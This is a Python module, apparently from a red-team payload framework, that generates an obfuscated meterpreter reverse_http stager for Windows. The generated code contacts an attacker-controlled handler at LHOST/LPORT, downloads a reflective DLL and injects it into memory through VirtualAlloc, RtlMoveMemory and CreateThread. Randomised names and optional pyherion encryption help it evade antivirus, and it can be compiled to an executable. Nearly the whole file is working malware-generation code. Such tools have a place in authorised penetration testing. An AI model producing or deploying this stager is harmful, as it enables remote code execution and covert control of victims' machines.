"""

Custom-written pure python meterpreter/reverse_http stager,
compatible with Cobalt-Stike's Beacon

Module by @harmj0y

"""

from modules.common import helpers
from modules.common import encryption


class Payload:

    def __init__(self):
        # required options
        self.description = "pure windows/meterpreter/reverse_http stager, no shellcode"
        self.language = "python"
        self.extension = "py"
        self.rating = "Excellent"

        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
                                    "USE_PYHERION"   : ["N", "Use the pyherion encrypter"],
                                    "LHOST"          : ["", "IP of the Metasploit handler"],
                                    "LPORT"          : ["8080", "Port of the Metasploit handler"]
                                }

    def generate(self):

        payloadCode = "import urllib2, string, random, struct, ctypes, time\n"

        # randomize everything, yo'
        sumMethodName = helpers.randomString()
        checkinMethodName = helpers.randomString()

        randLettersName = helpers.randomString()
        randLetterSubName = helpers.randomString()
        randBaseName = helpers.randomString()

        downloadMethodName = helpers.randomString()
        hostName = helpers.randomString()
        portName = helpers.randomString()
        requestName = helpers.randomString()
        tName = helpers.randomString()

        injectMethodName = helpers.randomString()
        dataName = helpers.randomString()
        byteArrayName = helpers.randomString()
        ptrName = helpers.randomString()
        bufName = helpers.randomString()
        handleName = helpers.randomString()
        data2Name = helpers.randomString()
        proxy_var = helpers.randomString()
        opener_var = helpers.randomString()

        # helper method that returns the sum of all ord values in a string % 0x100
        payloadCode += "def %s(s): return sum([ord(ch) for ch in s]) %% 0x100\n" %(sumMethodName)

        # method that generates a new checksum value for checkin to the meterpreter handler
        payloadCode += "def %s():\n\tfor x in xrange(64):\n" %(checkinMethodName)
        payloadCode += "\t\t%s = ''.join(random.sample(string.ascii_letters + string.digits,3))\n" %(randBaseName)
        payloadCode += "\t\t%s = ''.join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))\n" %(randLettersName)
        payloadCode += "\t\tfor %s in %s:\n" %(randLetterSubName, randLettersName)
        payloadCode += "\t\t\tif %s(%s + %s) == 92: return %s + %s\n" %(sumMethodName, randBaseName, randLetterSubName, randBaseName, randLetterSubName)

        # method that connects to a host/port over http and downloads the hosted data
        payloadCode += "def %s(%s,%s):\n" %(downloadMethodName, hostName, portName)
        payloadCode += "\t" + proxy_var + " = urllib2.ProxyHandler()\n"
        payloadCode += "\t" + opener_var + " = urllib2.build_opener(" + proxy_var + ")\n"
        payloadCode += "\turllib2.install_opener(" + opener_var + ")\n"
        payloadCode += "\t%s = urllib2.Request(\"http://%%s:%%s/%%s\" %%(%s,%s,%s()), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})\n" %(requestName, hostName, portName, checkinMethodName)
        payloadCode += "\ttry:\n"
        payloadCode += "\t\t%s = urllib2.urlopen(%s)\n" %(tName, requestName)
        payloadCode += "\t\ttry:\n"
        payloadCode += "\t\t\tif int(%s.info()[\"Content-Length\"]) > 100000: return %s.read()\n" %(tName, tName)
        payloadCode += "\t\t\telse: return ''\n"
        payloadCode += "\t\texcept: return %s.read()\n" %(tName)
        payloadCode += "\texcept urllib2.URLError, e: return ''\n"

        # method to inject a reflective .dll into memory
        payloadCode += "def %s(%s):\n" %(injectMethodName, dataName)
        payloadCode += "\tif %s != \"\":\n" %(dataName)
        payloadCode += "\t\t%s = bytearray(%s)\n" %(byteArrayName, dataName)
        payloadCode += "\t\t%s = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(%s)), ctypes.c_int(0x3000),ctypes.c_int(0x40))\n" %(ptrName, byteArrayName)
        payloadCode += "\t\t%s = (ctypes.c_char * len(%s)).from_buffer(%s)\n" %(bufName, byteArrayName, byteArrayName)
        payloadCode += "\t\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(%s),%s, ctypes.c_int(len(%s)))\n" %(ptrName, bufName, byteArrayName)
        payloadCode += "\t\t%s = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(%s),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n" %(handleName, ptrName)
        payloadCode += "\t\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(%s),ctypes.c_int(-1))\n" %(handleName)

        # download the metpreter .dll and inject it
        payloadCode += "%s = ''\n" %(data2Name)
        payloadCode += "%s = %s(\"%s\", %s)\n" %(data2Name, downloadMethodName, self.required_options["LHOST"][0], self.required_options["LPORT"][0])
        payloadCode += "%s(%s)\n" %(injectMethodName, data2Name)

        if self.required_options["USE_PYHERION"][0].lower() == "y":
            payloadCode = encryption.pyherion(payloadCode)

        return payloadCode

